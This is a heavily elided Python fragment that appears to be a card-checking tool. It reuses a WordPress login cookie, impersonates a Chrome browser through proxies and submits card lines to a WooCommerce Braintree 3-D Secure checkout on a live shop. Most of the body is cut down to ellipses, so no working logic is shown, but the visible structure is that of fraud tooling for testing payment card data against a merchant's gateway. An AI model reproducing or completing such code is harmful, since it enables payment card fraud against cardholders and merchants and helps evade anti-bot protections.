...
class CookieManager:
    def __init__(self, cookie_key='wordpress_logged_in_58c7e1766c2b741f3cec76459a4d745b'):
    ...
    def save_cookies(self, cookies_data):
        with open('b2.json', "w", encoding="utf-8") as f_coo:
        ...
        async with AsyncSession(impersonate="chrome110", proxies=proxies) as session:
            ...
            try:
                ...
                data_final = {
                    ...
                    "wc-braintree-credit-card-3d-secure-order-total": "184.87",
...
async def process_B3_2(card_line: str, proxy_url: str = None) -> tuple[str, str, bool]:
